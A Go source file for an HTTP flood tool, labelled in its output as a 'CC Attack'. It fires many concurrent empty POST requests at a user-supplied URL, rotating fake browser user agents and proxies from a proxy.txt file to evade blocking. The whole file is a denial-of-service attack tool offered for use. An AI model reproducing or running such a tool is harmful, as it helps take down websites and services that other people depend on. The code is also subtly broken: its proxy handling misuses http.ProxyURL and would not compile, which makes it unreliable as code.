package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "sync"
    "time"
    "bytes"
)

func main() {
    var wg sync.WaitGroup
    var targetURL string
    var numRequests, concurrency int

    fmt.Print("Enter target URL: ")
    fmt.Scanln(&targetURL)

    fmt.Print("Enter number of requests: ")
    fmt.Scanln(&numRequests)

    fmt.Print("Enter concurrency level: ")
    fmt.Scanln(&concurrency)

    // List of user agents
    userAgents := []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36",
        // Add more user agents as needed
    }

    // Open proxy.txt file
    file, err := os.Open("proxy.txt")
    if err != nil {
        fmt.Println("Error opening proxy file:", err)
        return
    }
    defer file.Close()

    // Read proxy.txt file line by line
    scanner := bufio.NewScanner(file)
    var proxies []string
    for scanner.Scan() {
        proxies = append(proxies, scanner.Text())
    }

    for i := 0; i < numRequests; i += concurrency {
        for j := 0; j < concurrency; j++ {
            wg.Add(1)
            go func() {
                defer wg.Done()
                // Create a POST request with empty body
                req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte("")))
                if err != nil {
                    fmt.Println("Error creating request:", err)
                    return
                }
                // Set the required headers
                req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
                req.Header.Set("User-Agent", userAgents[i%len(userAgents)])

                // Use a proxy if available
                if len(proxies) > 0 {
                    proxyURL := proxies[i%len(proxies)]
                    proxy, err := http.ProxyURL(proxyURL)
                    if err != nil {
                        fmt.Println("Error setting proxy:", err)
                    } else {
                        tr := &http.Transport{Proxy: proxy}
                        client := &http.Client{Transport: tr}
                        resp, err := client.Do(req)
                        if err != nil {
                            fmt.Println("Error sending request:", err)
                        } else {
                            resp.Body.Close()
                        }
                    }
                } else {
                    // Send the request without proxy
                    client := &http.Client{}
                    resp, err := client.Do(req)
                    if err != nil {
                        fmt.Println("Error sending request:", err)
                    } else {
                        resp.Body.Close()
                    }
                }
            }()
        }
        time.Sleep(time.Second)
    }

    wg.Wait()
    fmt.Println("CC Attack completed")
}
